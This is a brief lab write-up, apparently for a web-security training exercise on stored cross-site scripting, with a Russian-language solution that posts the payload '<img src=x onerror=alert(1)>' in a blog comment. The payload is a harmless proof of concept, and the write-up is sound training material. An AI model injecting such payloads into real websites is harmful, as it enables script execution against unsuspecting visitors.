# Stored XSS into HTML context with nothing encoded
APPRENTICE

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed.

## Решение
Оставляю комментарий к посту с текстом:
```
<img src=x onerror=alert(1)>
```
Задание выполнено.
